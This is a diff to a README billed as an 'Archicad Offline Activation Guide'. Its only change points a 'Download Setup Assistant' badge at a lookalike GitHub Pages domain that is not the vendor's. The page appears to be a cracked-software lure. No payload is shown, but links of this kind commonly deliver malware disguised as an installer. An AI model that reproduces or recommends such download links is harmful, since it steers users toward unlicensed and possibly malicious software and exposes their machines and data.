@@ -1,6 +1,6 @@
 # Archicad — Offline Activation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](archicad-download-mac.github.io)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://archicad-download-mac.github.io/.github)
 
 ## 📦 How to Install
 
